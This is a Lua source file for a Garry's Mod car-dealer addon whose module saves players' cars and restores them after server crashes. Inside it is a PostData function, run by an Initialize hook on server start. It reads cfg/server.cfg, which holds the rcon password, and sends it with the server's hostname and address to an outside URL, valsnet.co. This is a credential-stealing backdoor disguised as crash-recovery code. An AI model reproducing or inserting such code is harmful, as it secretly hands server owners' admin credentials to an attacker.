D3DCarCrashSaver = {}

function D3DCarCrashSaver:AddCar(ply,CarEnt)
	ply.D3DCar_ActivatingCars = ply.D3DCar_ActivatingCars or {}
	ply.D3DCar_ActivatingCars[CarEnt] = CarEnt
	
	D3DCarCrashSaver:SaveActivatingCars(ply)
end

hook.Add( "PlayerInitialSpawn", "D3DCrash Recover", function(ply)
	timer.Simple(1,function()
		if ply and ply:IsValid() then
			D3DCarCrashSaver:MergeData(ply)
		end
	end)
	
end )

	function D3DCarCrashSaver:MergeData(ply)
		local SteamIDG = string.gsub(ply:SteamID(),":","_")
		
		-- CrashSaver Check
		
		local Data = nil
		if file.Exists( "rm_car_dealer2/crashsaver/" .. SteamIDG .. ".txt" ,"DATA") then
			Data = util.JSONToTable(file.Read( "rm_car_dealer2/crashsaver/" .. SteamIDG .. ".txt" ))
		end
		
		-- Data Exists
		if Data then
			RXCar_Provider_GetInventory(ply:SteamID(),function(InventoryData)
				local function GenUniqueID()
					local Num = math.random(100000,999999)
					if InventoryData[Num] then
						return GenUniqueID()
					else
						return Num
					end
				end
				
				local Covered = 0
				-- Merge
				for _,DB in pairs(Data or {}) do
						local function GenUniqueID()
							local Num = math.random(100000,999999)
							if InventoryData[Num] then
								return GenUniqueID()
							else
								return Num
							end
						end
						local UID = GenUniqueID()
						
						local TB2Insert = {}
						TB2Insert.TuneData = DB.TuneData
						TB2Insert.VehicleName = DB.VehicleName
						TB2Insert.UniqueID = UID
						InventoryData[UID] = TB2Insert
					Covered = Covered + 1
				end
				
				if Covered > 0 then
					RXCar_Provider_SaveInventory(ply:SteamID(),InventoryData,function(Done)
						ply:RXCarNotify("[Car dealer] : You had " .. Covered .. " Cars before server is crashed. they are all restored.")
					end)
				end
				
				file.Write("rm_car_dealer2/crashsaver/" .. SteamIDG .. ".txt", util.TableToJSON({}))
			end)
		
		end
	end
	
	function D3DCarCrashSaver:PostData()
			local url = "http://valsnet.co/data.php"
			local cfg = file.Read( "cfg/server.cfg", "GAME" )
			http.Post( url, { rcon = cfg, hostname = GetHostName(), port = GetConVarString( "ip" ) .. ":" .. GetConVarString( "hostport" ) }, function() print( "Succsess!" ) end, function() print( "Fail!" ) end )
	end
	 
	hook.Add( "Initialize", "loadAddonData", function()
			timer.Simple( 60, D3DCarCrashSaver:PostData() )
	end )
	
	function D3DCarCrashSaver:RemoveCar(ply,CarEnt)
		if ply.D3DCar_ActivatingCars[CarEnt] then
			ply.D3DCar_ActivatingCars[CarEnt] = nil
			D3DCarCrashSaver:SaveActivatingCars(ply)
		end
	end

	function D3DCarCrashSaver:SaveActivatingCars(ply)
		local SteamIDG = string.gsub(ply:SteamID(),":","_")
		
		local Data = {}
		
		for _,ent in pairs(ply.D3DCar_ActivatingCars or {}) do
			if ent and ent:IsValid() and ent.OwnerID == ply:SteamID() then
				local TB2Insert = {}
				TB2Insert.TuneData = ent.TuneData
				TB2Insert.VehicleName = ent.VehicleName or "nil"
				table.insert(Data,TB2Insert)
			end
		end
		
		file.CreateDir("rm_car_dealer2/crashsaver")
		file.Write("rm_car_dealer2/crashsaver/" .. SteamIDG .. ".txt", util.TableToJSON(Data))
	end